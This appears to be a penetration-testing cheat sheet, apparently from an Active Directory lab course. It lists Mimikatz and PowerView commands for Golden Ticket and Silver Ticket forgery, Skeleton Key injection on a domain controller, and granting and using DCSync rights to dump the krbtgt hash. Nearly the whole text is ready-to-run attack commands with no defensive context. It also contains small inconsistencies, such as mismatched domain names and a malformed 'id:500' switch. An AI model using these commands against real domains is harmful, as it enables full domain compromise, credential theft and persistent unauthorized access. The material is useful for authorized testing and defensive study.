### Golden Ticket
```powershell
## Invoke-Mimikatz
## Execute mimikatz on DC as DA to get hashes
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
## Golden Ticket
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /krbtgt:0c88028bf3aa6a6a143ed846f2be1ea4 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
### Silver Ticket
```powershell
## Silver Ticket for service HOST
Invoke-Mimikatz -Command '"kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:0c88028bf3aa6a6a143ed846f2be1ea4 /user:Administrator /ptt"'
```
### Skeleton Key
```powershell
## Command to inject a skeleton key
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'-ComputerName dcorp-dc.corporate.corp.local
```

### DCSync
```powershell
## Checking w/ powerview and invoke-mimikatz
## Check if user01 has these permissions
Get-ObjectAcl -DistinguishedName "dc=corporate,dc=corp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "user01") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
## If you are a domain admin, you can grant this permissions to any user
Add-ObjectAcl -TargetDistinguishedName "dc=corporate,dc=corp,dc=local" -PrincipalSamAccountName user01 -Rights DCSync -Verbose
## Gets the hash of krbtgt
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```